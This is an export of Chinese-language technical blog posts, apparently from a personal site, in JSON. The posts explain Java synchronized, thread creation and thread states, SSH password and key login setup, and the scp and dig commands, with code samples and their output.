Thread.sleep((long) Math.random() * 1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(\"World: \" + i); &#125; &#125; &#125;&#125;class Thread1 extends Thread &#123; private Example example; public Thread1(Example example) &#123; this.example = example; &#125; @Override public void run() &#123; example.execute(); &#125;&#125;class Thread2 extends Thread &#123; private Example example; public Thread2(Example example) &#123; this.example = example; &#125; @Override public void run() &#123; example.execute2(); &#125;&#125; 执行结果12345678910Hello: 0Hello: 1Hello: 2Hello: 3Hello: 4World: 0World: 1World: 2World: 3World: 4 分析例子程序4所达到的效果和例子程序2的效果一样，即都是使得两个线程的执行顺序进行，而不是并发进行。 当一个线程执行时，将object对象锁住，另一个线程就不能执行对应的块。 synchronized方法（即同步方法）实际上等同于用一个synchronized块包住方法中的所有语句，然后在synchronized块的括号中传入this关键字（以锁住当前对象）。当然，如果是静态方法，需要锁定的则是class对象。 因为可能一个方法中只有几行代码会涉及到线程同步问题， 所以synchronized块比synchronized方法更加细粒度地控制了多个线程的访问，只有synchronized块中的内容不能同时被多个线程所访问，方法中的其他语句仍然可以同时被多个线程所访问（包括synchronized块之前的和之后的）。 注意：被synchronized保护的数据应该是私有的。 因此： synchronized方法（同步方法）是一种粗粒度的并发控制，某一时刻，只能有一个线程执行该synchronized方法； synchronized块则是一种细粒度的并发控制，只会将块中的代码同步，位于方法内、synchronized块之外的其他代码是可以被多个线程同时访问到的。 synchronized的底层实现我们来看看synchronized的具体底层实现。先写一个简单的demo: 12345678910public class SynchronizedDemo &#123; public static void main(String[] args) &#123; synchronized (SynchronizedDemo.class) &#123; &#125; method(); &#125; private synchronized static void method() &#123; &#125;&#125; 上面的代码中有一个同步代码块，锁住的是 SynchronizedDemo 类对象。还有一个同步静态方法，锁住的依然是 SynchronizedDemo 类对象。用javap -v SynchronizedDemo.class查看字节码文件： 如图，上面用黄色高亮的部分就是需要注意的部分了，这一部分与synchronized关键字对应。 执行同步代码块前，首先要先执行 monitorenter 指令，退出的时候 monitorexit 指令。通过分析之后可以看出，使用synchronized进行同步，其关键就是必须要对对象的监视器monitor进行获取，当线程获取monitor后才能继续往下执行，否则就只能等待。 这个获取的过程是互斥的，即同一时刻只有一个线程能够获取到monitor。 在上面的例子中，在执行完同步代码块之后紧接着再会去执行一个静态同步方法，而这个方法锁的对象依然就这个 SynchronizedDemo 类对象。 那么这个正在执行的线程还需要获取该锁吗？答案是不必的。 从上图中就可以看出来，执行静态同步方法的时候就只有一条monitorexit指令，并没有monitorenter获取锁的指令。这就是锁的重入性，即在同一锁程中，线程不需要再次获取同一把锁。synchronized先天具有重入性。每个对象拥有一个计数器，当线程获取该对象锁后，计数器就会加一，释放锁后就会将计数器减一。 任意一个对象都拥有自己的监视器，当这个对象由同步块或者这个对象的同步方法调用时，执行方法的线程必须先获取该对象的监视器才能进入同步块或同步方法，如果没有获取到监视器的线程将会被阻塞在同步块和同步方法的入口处，因而进入到阻塞状态。 下图表现了对象，对象监视器，同步队列以及执行线程状态之间的关系： 该图可以看出，任意线程对Object的访问，首先要获得Object的监视器，如果获取失败，该线程就被放入同步队列（Synchronized Queue），线程状态被置为阻塞状态，当Object的监视器占有者释放后，在同步队列中的线程就会有机会重新获取该监视器。 synchronized的讨论在 Java 并发编程这个领域中，synchronized关键字一直都是元老级的角色，很久之前很多人都会称它为“重量级锁”。但是，在 Java SE 1.6之后，为了减少获得锁和释放锁带来的性能消耗，引入了偏向锁、轻量级锁以及其它的优化（比如适应性自旋），相对于synchronized而言，后者更为轻量级。 Reference 《深入理解Java虚拟机》 Java 多线程（六） synchronized关键字详解 - https://www.cnblogs.com/mengdd/archive/2013/02/16/2913806.html Java 多线程（五） 多线程的同步 - https://www.cnblogs.com/mengdd/archive/2013/02/16/2913680.html 彻底理解synchronized - https://juejin.im/post/5ae6dc04f265da0ba351d3ff Java并发——关键字synchronized解析 - https://juejin.im/post/5b42c2546fb9a04f8751eabc","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】多线程-线程基础","date":"2019-01-31T10:39:38.000Z","path":"2019/01/31/【Java】多线程-线程基础/","text":"线程的实现Thread类是专门用来创建线程和对线程进行操作的类。当某个类继承了Thread类之后，该类就叫做一个线程类。 在Java中通过run方法为线程指明要完成的任务，有两种方法来为线程提供run方法： 继承Thread类并重写它的run方法。之后创建这个子类的对象并调用start()方法。 通过定义实现Runnable接口的类进而实现run方法。这个类的对象在创建Thread的时候作为参数被传入，然后调用start()方法。 无论在哪种创建线程的两种方法中，均需调用线程对象的start()方法以为线程分配必须的系统资源、调度线程运行并执行线程的run()方法。 start()方法是启动线程的唯一的方法。start()方法首先为线程的执行准备好系统资源，然后再去调用run()方法。一个线程只能启动一次，再次启动就不合法了。 run()方法中放入了线程的工作，即我们要这个线程去做的所有事情。缺省状况下run()方法什么也不做。 在具体应用中，采用哪种方法来构造线程要视情况而定。通常，当一个线程已经继承了另一个类时，就应该用第二种方法来构造，即实现Runnable接口。 下面给出两个例子来说明线程的两种实现方法，每个例子中都有两个线程： 线程的运行与停止例子1 - 创建线程对象代码123456789101112131415161718192021222324252627public class Main &#123; public static void main(String[] args) &#123; Thread1 thread1 = new Thread1(); Thread2 thread2 = new Thread2(); thread1.start(); thread2.start(); &#125;&#125;class Thread1 extends Thread &#123; @Override public void run() &#123; for (int i = 0; i &lt; 5; ++i) &#123; System.out.println(\"Hello World: \" + i); &#125; &#125;&#125;class Thread2 extends Thread &#123; @Override public void run() &#123; for (int i = 0; i &lt; 5; ++i) &#123; System.out.println(\"Welcome: \" + i); &#125; &#125;&#125; 执行结果12345678910Hello World: 0Welcome: 0Hello World: 1Welcome: 1Hello World: 2Hello World: 3Hello World: 4Welcome: 2Welcome: 3Welcome: 4 由于这两个线程几乎在同一时间被置为runnable状态，因此 Hello World 和 Welcome 大打印顺序完全又 JVM 对这两个线程的调度决定，我们不可提前预知。 例子2 - 创建线程对象代码12345678910111213141516171819202122232425262728public class Main &#123; public static void main(String[] args) &#123; // 线程的另一种实现方法，也可以使用匿名的内部类 Thread thread1 = new Thread(new MyThread1()); thread1.start(); Thread thread2 = new Thread(new MyThread2()); thread2.start(); &#125;&#125;class MyThread1 implements Runnable &#123; @Override public void run() &#123; for (int i = 0; i &lt; 5; ++i) &#123; System.out.println(\"Hello: \" + i); &#125; &#125;&#125;class MyThread2 implements Runnable &#123; @Override public void run() &#123; for (int i = 0; i &lt; 5; ++i) &#123; System.out.println(\"Welcome: \" + i); &#125; &#125;&#125; 执行结果12345678910Hello: 0Hello: 1Hello: 2Hello: 3Hello: 4Welcome: 0Welcome: 1Welcome: 2Welcome: 3Welcome: 4 分析Thread类也实现了Runnable接口，因此实现了接口中的run()方法。 当生成一个线程对象时，如果没有为其指定名字，那么线程对象的名字将使用如下形式：Thread-number，该number是自动增加的数字，并被所有的Thread对象所共享，因为它是一个static的成员变量。 当使用第一种方式（继承Thread的方式）来生成线程对象时，我们需要重写run()方法。 当使用第二种方式（实现Runnable接口的方式）来生成线程对象时，我们需要实现Runnable接口的run()方法，然后使用new Thread(new MyRunnableClass())来生成线程对象（MyRunnableClass已经实现了Runnable接口），这时的线程对象的run()方法会调用MyRunnableClass的run()方法。 停止线程线程的消亡不能通过调用stop()命令，stop()方法是不安全的，已经废弃。 停止线程推荐的方式：设定一个标志变量，以让run()方法在执行完成时线程也结束执行。 具体的来说，在run()方法中是一个循环，由该标志变量控制循环是继续执行还是跳出；循环跳出，则线程结束。 代码演示12345678910111213141516171819202122232425public class Main &#123; public static void main(String[] args) &#123; MyThreadClass r = new MyThreadClass(); Thread t = new Thread(r); t.start(); // 当希望线程停止执行时，调用以下方法 r.stopRunning(); &#125;&#125;class MyThreadClass implements Runnable &#123; private boolean flag = true; @Override public void run() &#123; while (flag) &#123; System.out.println(\"Do something.\"); &#125; &#125; public void stopRunning() &#123; flag = false; &#125;&#125; 多线程访问成员变量与局部变量例子1 - 多线程访问成员变量代码123456789101112131415161718192021222324252627282930313233343536public class Main &#123; public static void main(String[] args) &#123; HelloThread r = new HelloThread(); Thread t1 = new Thread(r); Thread t2 = new Thread(r); t1.start(); t2.start(); &#125;&#125;class HelloThread implements Runnable &#123; int i; @Override public void run() &#123; while (true) &#123; Thread t = Thread.currentThread(); String name = t.getName(); System.out.println(name + \" say: hello number: \" + i++); try &#123; Thread.sleep((long) Math.random() * 1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; if (10 == i) &#123; break; &#125; &#125; &#125;&#125; 运行结果12345678910Thread-1 say: hello number: 0Thread-0 say: hello number: 1Thread-1 say: hello number: 2Thread-0 say: hello number: 3Thread-1 say: hello number: 4Thread-0 say: hello number: 5Thread-1 say: hello number: 6Thread-0 say: hello number: 7Thread-1 say: hello number: 8Thread-0 say: hello number: 9 分析由于HelloThread类的实例r对象被两个线程（t1与t2线程对象）共享，而i又为r对象的成员变量。因此，t1和t2线程会交替的数数（依次打印从0到9），直到i&gt;10时结束。 例子2 - 多线程访问局部变量当我们改变代码如下时（原先的成员变量i被注释掉，增加了方法中的局部变量i）： 代码1234567891011121314151617181920212223242526272829303132333435363738public class Main &#123; public static void main(String[] args) &#123; HelloThread r = new HelloThread(); Thread t1 = new Thread(r); Thread t2 = new Thread(r); t1.start(); t2.start(); &#125;&#125;class HelloThread implements Runnable &#123; @Override public void run() &#123; // 每一个线程都会拥有自己的一份局部变量的拷贝 // 线程之间互不影响 // 所以会打印20个数字，0到9每个数字都是两遍 int i = 0; while (true) &#123; Thread t = Thread.currentThread(); String name = t.getName(); System.out.println(name + \" say: hello number: \" + i++); try &#123; Thread.sleep((long) Math.random() * 1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; if (10 == i) &#123; break; &#125; &#125; &#125;&#125; 运行结果1234567891011121314151617181920Thread-0 say: hello number: 0Thread-1 say: hello number: 0Thread-1 say: hello number: 1Thread-0 say: hello number: 1Thread-1 say: hello number: 2Thread-0 say: hello number: 2Thread-1 say: hello number: 3Thread-0 say: hello number: 3Thread-1 say: hello number: 4Thread-0 say: hello number: 4Thread-1 say: hello number: 5Thread-0 say: hello number: 5Thread-1 say: hello number: 6Thread-0 say: hello number: 6Thread-1 say: hello number: 7Thread-0 say: hello number: 7Thread-1 say: hello number: 8Thread-0 say: hello number: 8Thread-1 say: hello number: 9Thread-0 say: hello number: 9 分析如注释中所述，由于局部变量对于每一个线程来说都有自己的拷贝，所以各个线程之间不再共享同一个变量，输出结果为20个数字，实际上是两组，每组都是0到9的10个数字，并且两组数字之间随意地穿插在一起。 结论 如果一个变量是成员变量，那么多个线程对同一个对象的成员变量进行操作时，它们对该成员变量是彼此影响的，也就是说一个线程对成员变量的改变会影响到另一个线程。 如果一个变量是局部变量，那么每个线程都会有一个该局部变量的拷贝（即便是同一个对象中的方法的局部变量，也会对每一个线程有一个拷贝），一个线程对该局部变量的改变不会影响到其他线程。 Reference Java 多线程（二） 线程的实现 - https://www.cnblogs.com/mengdd/archive/2013/02/16/2913637.html Java 多线程（四） 多线程访问成员变量与局部变量 - https://www.cnblogs.com/mengdd/archive/2013/02/16/2913659.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】多线程 - Java中的线程状态及状态切换","date":"2019-01-31T10:33:21.000Z","path":"2019/01/31/【Java】多线程-Java中的线程状态及状态切换/","text":"Java 的线程状态Java 语言中定义了 6 种线程状态，在任意一个时间点，一个线程有且只有其中一种状态，这 6 种状态是： 新建（New）：一个已经被实例化线程对象但未被启动（start）的线程处于这种状态。 可运行（Runnable）：包括了操作系统线程状态中的 Running 和 Ready。因此，处于此状态的线程有可能正在执行，也有可能正在等待着CPU为它分配执行时间（CPU时间片）。 无限期等待（Waiting）：线程处于无限期等待表示它需要等待并获得其他线程的指示后才能继续运行。处于这种状态的线程不会被分配 CPU 执行时间，直到当其他的一个线程完成了一个操作后显式地通知这个线程。 限期等待（Timed Waiting）：处于这种状态的线程也不会被分配 CPU 执行时间，不过无须等待被其他线程显式地唤醒，在一定时间之后它们会由操作系统自动唤醒，以结束限期等待状态。 阻塞（Blocked）：线程被阻塞了，在等待进入同步区域（synchronized）时，线程将进入这种状态。处于阻塞态的线程会不断请求资源，一旦请求成功，就会进入就绪队列，等待执行。 结束（Terminated）：已终止的线程状态，线程已经结束执行。 注意，以上所指的线程状态均是 Java 线程在 JVM 中的状态，因此并不意味着此时对应于操作系统中的线程状态。 关于锁的持有 Object.wait() 方法会释放 CPU 执行权和占有的锁。 Thread.sleep(long) 方法仅释放 CPU 使用权，锁仍然占用。 Thread.yield() 方法仅释放 CPU 执行权，锁仍然占用，线程会被放入就绪队列，会在短时间内再次执行。 等待（waiting）与阻塞（blocked）的区别blocked 是过去分词，意味着他是被卡住的。因为这段代码在同一时刻只让一个线程执行。同时，JVM 会负责多个线程进入同步区的调度工作。因此，只要别的线程退出这段代码（放弃持有互斥锁），JVM 就会自动让你进去。也就是说别的线程无需唤醒你，由 JVM 自动来干。 而 waiiting 是说线程自己调用 wait() 等函数，主动卡住自己，请 JVM 在满足某种条件后（比如另外的线程调用了notify()），把我唤醒。这个唤醒的责任在于别的线程，唤醒的方法为显式地调用一些唤醒函数（比如，o.notifyAll()或o.notify()）。 一句话概括，WAITTING 线程是自己现在不想要 CPU 时间片（因而暂停自己），但是 BLOCKED 线程是想要的，只是 BLOCKED 线程没有获得锁，所以它获取不到 CPU 时间片。 做这样的区分，是 JVM 出于管理的需要。如果别的线程运行出了synchronized 这段代码，JVM 只需要去 blocked 队列，放一个线程出来。而某个线程调用了 notify() 后，JVM 只需要去 waitting 队列里取一个线程出来。 P.S. 从Linux内核来看，这些线程都是阻塞状态（Blocked），没区别，区别只在于 Java 的管理需要。在操作系统中，有三种状态： 运行（Running）：在这一刻使用CPU。 就绪（Ready）：可以被运行（runnable），只是暂时地被停止以让其他进程运行。 阻塞（Blocked）：不能被运行直到一些依赖的外部事件发生。 通常我们在系统级别说线程的阻塞（Blocked），是说在线程进行I/O操作时，因为I/O数据没有就绪因而需要等待，这种线程由 Linux 内核来唤醒（当I/O数据到来时，内核就把 Blocked 的线程放进可运行的线程队列，依次得到CPU时间）。而在系统级别说线程的wait，是指线程等待一个内核mutex对象，另个线程signal这个mutex后，这个线程才可以运行。 这里的区别在于由谁唤醒，是操作系统，还是另一个线程。 线程的生命周期（Life Cycle） 线程间的状态转换1 新建(New) - 就绪（Ready）- 运行中（Running）新创建了一个线程对象后，其他线程（如main线程）调用该线程对象的 start() 方法以使其进入就绪状态。 处于就绪状态的线程位于可运行线程池中，等待被线程调度选中后可获取CPU 的使用权。 运行状态（Running）的线程会获得了CPU 时间片（timeslice） ，并执行程序代码。 12Thread thread = new Thread();thread.start(); 不区分就绪（Ready）和运行中（Running）我们可能会问，为何 JVM 中没有去区分就绪（Ready）和运行中（Running）这两种状态，而是统一归为可运行（Runnable）呢？ 现在的时分（time-sharing）多任务（multi-task）操作系统架构通常都是用所谓的时间分片（time quantum or time slice）方式进行抢占式（preemptive）轮转调度（round-robin）的。 这个时间分片通常是很小的，一个线程一次最多只能在 CPU 上运行比如10-20ms 的时间（此时处于 Running 状态），也即大概只有0.01秒这一量级，时间片用完后就要被切换下来放入调度队列的末尾等待再次调度。（也即回到 Ready 状态） 通常，Java的线程状态是服务于监控的，如果线程切换得是如此之快，那么区分 Ready 与 Running 就没什么太大意义了。 start() 和 run() 方法的区别start()Thread类的 start 方法被用来启动一个线程，并将其置为就绪状态。run 方法为这个线程真正要执行的方法。然而，调用 start 方法后，run 方法并不会立刻被调用，而是等待合适的时机时，线程调度器才会将这个线程置为运行（running）状态，最终 run 方法被调用。 这意味着，当调用 start 方法时，无需等待 run 方法体代码执行而直接继续执行下面的代码。一旦得到 CPU 时间片，就开始执行 run 方法，run方法运行结束，此线程随即终止。 run()run() 方法只是类的一个普通方法而已，如果直接调用 run 方法，程序中依然只有主线程这一个线程（而不会创建一个新线程），其程序执行路径还是只有一条，还是要顺序执行，还是要等待run方法体执行完毕后才可继续执行下面的代码，这样就没有达到开启新线程的目的。 总结：调用 start 方法方可启动线程，而 run 方法只是一个普通方法的，因此在主线程中调用 run 方法，不会开启一个新线程，而只会在主线程中执行这个 run 方法中的方法体。 2 运行中（Running） - 就绪（Ready） Thread.yield() 的调用显式地使线程调度器（Thread Scheduler）暂停当前处于 Running 状态的线程，让出 CPU 时间片以让其他线程执行。 3 进入限期等待（Timed Waiting）状态限期等待（Timed Waiting），也可以称作 TIMED_WAITING（有等待时间的等待状态）。限期等待状态是线程自己主动发起的， 线程主动调用自己的以下方法，会使其进行限期等待（Timed Waiting）： Thread.sleep(sleeptime)，且带有时间； Object.wait(timeout)，且带有时间； Thread.join(timeout)，且带有时间； LockSupport.parkNanos()，且带有时间； LockSupport.parkUntil()，且带有时间； 4 进入无限期等待（Waiting）状态处于无限期等待（Waiting）的线程限期等待状态是线程自己主动发起的， 可运行状态的线程调用以下方法，会进入无限期等待状态： Object.wait()方法，并且没有使用timeout参数; Thread.join()方法，没有使用timeout参数； LockSupport.park()； Conditon.await()方法。 5 进入阻塞（Blocked）状态阻塞状态是指线程因为某种原因JVM放弃了其 CPU 的使用权，暂时停止运行。 阻塞的情况分两种： 进入synchronized方法：运行（Running）的线程进入了一个synchronized方法时，若该互斥锁（Mutual-exclusion lock）被别的线程占用，则JVM会把该线程放入锁池（lock pool）中，且该线程进入阻塞状态；若该同步锁未被别的线程占用（该线程顺利获取到了锁），则线程状态没有变化。 I/O操作：运行（Running）的线程发出了I/O请求时，JVM会把该线程置为阻塞状态。当I/O处理完毕时，线程重新转入可运行（Runnable）状态。 直到线程进入可运行（Runnable）状态，才有机会再次获得CPU时间片而转到运行（Running）状态。 6 限期等待（Timed Waiting）/无限期等待（Waiting） - 阻塞（Blocked）当一个线程调用一个对象的Object.wait()方法后，就会进入限期等待（Timed Waiting）/无限期等待（Waiting）状态。直到另一个线程调用了这个对象的 Object.notify() or Object.notifyAll() ，且这个线程希望持有的锁被其他线程持有，就会从等待状态切换到阻塞状态。 7 限期等待（Timed Waiting） - 可运行（Runnable）在到达指定时间后，处于限期等待的线程会恢复可运行状态。 8 进入结束（Terminated）状态线程run()、main() 方法执行结束，或者因异常退出了run()方法，则该线程结束生命周期。 Reference Oracle Enum Thread.State - https://docs.oracle.com/javase/7/docs/api/java/lang/Thread.State.html Java 6 Thread States and Life Cycle - https://www.uml-diagrams.org/examples/java-6-thread-state-machine-diagram-example.html 《Modern Operating System 4th》 https://github.com/TFdream/blog/blob/master/contents/Concurrent/Thread_Lifecycle.md - 线程的生命周期 java线程运行怎么有第六种状态？ - https://www.zhihu.com/question/56494969 Java线程中wait状态和block状态的区别? - https://www.zhihu.com/question/27654579/answer/128050125 Java 多线程（七） 线程间的通信——wait及notify方法 - https://www.cnblogs.com/mengdd/archive/2013/02/20/2917956.html [简谈Java的join()方法 - https://www.cnblogs.com/techyc/p/3286678.html (四)Thread.join的作用和原理 - https://segmentfault.com/a/1190000017255019","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Linux】SSH登录与管理","date":"2019-01-31T03:38:59.000Z","path":"2019/01/31/【Linux】SSH登录与管理/","text":"什么是SSH简单说，SSH是一种网络协议，用于计算机之间的加密登录。 如果一个用户从本地计算机，使用SSH协议登录另一台远程计算机，我们就可以认为，这种登录是安全的，即使被中途截获，密码也不会泄露。 最早的时候，互联网通信都是明文通信，一旦被截获，内容就暴露无疑。1995年，芬兰学者Tatu Ylonen设计了SSH协议，将登录信息全部加密，成为互联网安全的一个基本解决方案，迅速在全世界获得推广，目前已经成为Linux系统的标准配置。 需要指出的是，SSH只是一种协议，存在多种实现，既有商业实现，也有开源实现。本文针对的实现是OpenSSH，它是自由软件，应用非常广泛。 SSH基本使用1$ssh [用户名]@[IP地址] 如果本地用户名与远程用户名一致，登录时可以省略用户名。 1$ssh [用户名] SSH的默认端口是22，也就是说，你的登录请求会送进远程主机的22端口。使用p参数，可以修改这个端口。 1$ssh [用户名]@[IP地址] -p 端口号 SSH的过程SSH的整个过程是这样的： 远程主机收到用户的登录请求，把自己的公钥发给用户。 用户使用这个公钥，将自己输入的登录密码加密后，发送给远程主机。 远程主机用自己的私钥，解密输入的登录密码，如果密码正确，就同意用户登录。 这个过程本身是安全的，但是实施的时候存在一个风险：如果有人截获了登录请求，然后冒充远程主机，将伪造的公钥发给用户，那么用户很难辨别真伪。因为不像HTTPS协议，SSH协议的公钥是没有证书中心（CA）公证的，也就是说，都是自己签发的。 可以设想，如果攻击者插在用户与远程主机之间（比如在公共的wifi区域），用伪造的公钥，获取用户的登录密码。再用这个密码登录远程主机，那么SSH的安全机制就荡然无存了。这种风险就是著名的“中间人攻击”（Man-in-the-middle attack）。 Ubuntu下使用SSH远程登录与禁止登录方法如果你只是想登陆别的机器的SSH只需要安装openssh-client（ubuntu有默认安装，如果没有则 sudo apt-get install openssh-client），如果要使本机开放SSH服务就需要安装openssh-server。 1234567891011121314151617181920# ubuntu默认是不启用root用户也不允许root远程登录的。所以需要先启用root用户# 启用root用户$ sudo passwd root //修改密码后就启用了。# 查看当前的ubuntu是否安装了ssh-server服务$ dpkg -l | grep ssh# 安装ssh-server服务$ sudo apt-get install openssh-server# 再次查看安装的服务：$ dpkg -l | grep ssh# 然后确认ssh-server是否启动了：$ ps -e | grep ssh# 如果看到sshd那说明ssh-server已经启动了。# 如果没有则可以这样启动$ sudo /etc/init.d/ssh start或sudo service ssh start 配置文件： ssh-server配置文件位于/etc/ssh/sshd_config，在这里可以定义SSH的服务端口，默认端口是22，你可以自己定义成其他端口号，如222。 把配置文件中的”PermitRootLogin without-password”加一个”#”号，把它注释掉，再增加一句”PermitRootLogin yes”。 查找 AllowUsers ，如果没有则加上。 1AllowUsers sw root 上面表达的意思就是只允许 sw 和root用户远程登录。 12# 重启 openssh server$ sudo service ssh restart 密码登录如果你是第一次登录对方主机，系统会出现下面的提示： 1234567$ ssh user@hostThe authenticity of host 'host (12.18.429.21)' can't be established.RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d.Are you sure you want to continue connecting (yes/no)? 这段话的意思是，无法确认host主机的真实性，只知道它的公钥指纹，问你还想继续连接吗？ 所谓”公钥指纹”，是指公钥长度较长（这里采用RSA算法，长达1024位），很难比对，所以对其进行MD5计算，将它变成一个128位的指纹。上例中是98:2e:d7:e0:de :9f:ac:67:28:c2:42:2d:37:16:58:4d，再进行比较，就容易多了。 很自然的一个问题就是，用户怎么知道远程主机的公钥指纹应该是多少？回答是：没有好办法！ 远程主机可以在自己的网站上贴出公钥指纹（这其实类似于一些开源软件会在其网站上把发布的binary file对应的MD5列出来），以便用户自行核对。 假定经过风险衡量以后，用户决定接受这个远程主机的公钥。 1Are you sure you want to continue connecting (yes/no)? yes 系统会出现一句提示，表示host主机已经得到认可。 1Warning: Permanently added &apos;host,12.18.429.21&apos; (RSA) to the list of known hosts. 然后，会要求输入密码。 1Password: (enter password) 如果密码正确，就可以登录了。 当远程主机的公钥被接受以后，它就会被保存在文件 $HOME/.ssh/known_hosts 之中。下次再连接这台主机，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示需要输入密码。 每个SSH用户都有自己的known_hosts文件，此外系统也有一个这样的文件，通常是/etc/ssh/ssh_known_hosts，保存一些对所有用户都可信赖的远程主机的公钥。 注意： $HOME/.ssh/id_rsa.pub 中保存了本机SSH的公钥。 $HOME/.ssh/id_rsa 中保存了本机SSH的私钥。 $HOME/.ssh/known_hosts 中保存了之前接受的所有远程主机的公钥。 公钥登录使用密码登录，每次都必须输入密码，非常麻烦。好在SSH还提供了公钥登录，可以省去输入密码的步骤。 所谓”公钥登录”，原理很简单，就是用户将自己的公钥储存在远程主机上。 当用户登录远程主机的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回给远程主机。远程主机用事先储存在主机上的的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码。 Github、Gitlab其实就是保存当前主机的公钥，因而每次执行 git 相关操作的时候（比如 git push/pull ）就不再需要我们每次都输入密码。而事实上，是使用公钥来完成身份校验的。 如果当前主机已经生成过公钥了，则可以直接跳过下面步骤 公钥生成的方法这种方法要求用户必须提供自己的公钥。如果没有现成的，可以直接用ssh-keygen生成一个： 1$ ssh-keygen 运行上面的命令以后，系统会出现一系列提示，可以一路回车。其中有一个问题是，要不要对私钥设置口令（passphrase），如果担心私钥的安全，这里可以设置一个。 运行结束以后，在$HOME/.ssh/目录下，会新生成两个文件：id_rsa.pub和id_rsa。前者文件中保存的是你的公钥，后者中是你的私钥。 这时再输入下面的命令，将公钥传送到远程主机host上面： 123456789101112$ ssh-copy-id &lt;user&gt;@&lt;host&gt;# e.g.$ ssh-copy-id weishi@192.168.16.227/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: \".ssh/id_rsa.pub\"/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keysNumber of key(s) added: 1Now try logging into the machine, with: \"ssh 'weishi@192.168.16.227'\"and check to make sure that only the key(s) you wanted were added. 如果本机有多个公钥，也可以用 -i 来指定一个特定的你想使用的公钥的路径： 1$ ssh-copy-id -i ~/.ssh/id_rsa.pub pi@192.168.2.148 好了，从此以后，你再 SSH 登录远程主机时，就不需要输入密码了（因为远程主机中保存了当前主机的公钥，因而可以直接验证当前主机的身份，而不需要它提供登录密码）。 如果还是不行，就打开远程主机的/etc/ssh/sshd_config这个文件，检查下面几行前面”#”注释是否取掉。 123RSAAuthentication yesPubkeyAuthentication yesAuthorizedKeysFile .ssh/authorized_keys 然后，重启远程主机的ssh服务。 12345// ubuntu系统$ service ssh restart// debian系统$ /etc/init.d/ssh restart Reference 如何使用SSH登录远程服务器 - https://blog.csdn.net/u011054333/article/details/52443061 SSH原理与运用（一）：远程登录 - http://www.ruanyifeng.com/blog/2011/12/zen_and_the_art_of_motorcycle_maintenance.html","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】命令 - scp 命令","date":"2019-01-30T10:24:48.000Z","path":"2019/01/30/【Linux】命令-scp命令/","text":"scp 跨机远程拷贝scp是secure copy的简写，用于在Linux下进行远程拷贝文件的命令，和它类似的命令有cp，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。当你服务器硬盘变为只读 read only system时，用scp可以帮你把文件移出来。 类似的工具有rsync；scp消耗资源少，不会提高多少系统负荷，在这一点上，rsync就远远不及它了。rsync比scp会快一点，但当小文件多的情况下，rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用。 命令格式1scp [参数] [原路径] [目标路径] 例子实例1：从远处复制文件到本地目录1$scp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/ 说明： 从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中 实例2：从远处复制到本地1$scp -r root@10.6.159.147:/opt/soft/test /opt/soft/ 说明： 从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。 实例3：上传本地文件到远程机器指定目录1$scp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest 说明： 复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录 实例4：上传本地目录到远程机器指定目录1$scp -r /opt/soft/test root@10.6.159.147:/opt/soft/scptest 说明： 上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中 Reference scp 跨机远程拷贝 - https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/scp.html","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】命令 - dig 命令","date":"2019-01-30T10:09:43.000Z","path":"2019/01/30/【Linux】命令-dig命令/","text":"dig命令dig（域信息搜索器）命令是一个用于询问 DNS 域名服务器的灵活的工具。它执行 DNS 查询，显示从已查询名称服务器返回的应答。多数 DNS 管理员使用 dig 命令 来诊断 DNS 问题，因为它灵活性好、容易使用、输出清晰。 除非被告知查询特定名称服务器，否则 dig 命令将尝试查询 /etc/resolv.conf 文件中列示的每个服务器。如果未指定任何命令行参数或选项，那么 dig 命令会对“.”（根目录）执行 NS 查询。 例子123456789101112131415161718192021222324252627282930$ dig www.weibo.com; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; www.weibo.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 28600;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 6, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;www.weibo.com. IN A;; ANSWER SECTION:www.weibo.com. 180 IN A 180.149.134.142www.weibo.com. 180 IN A 180.149.138.56www.weibo.com. 180 IN A 180.149.134.141;; AUTHORITY SECTION:weibo.com. 62175 IN NS ns4.sina.com.cn.weibo.com. 62175 IN NS ns4.sina.com.weibo.com. 62175 IN NS ns3.sina.com.weibo.com. 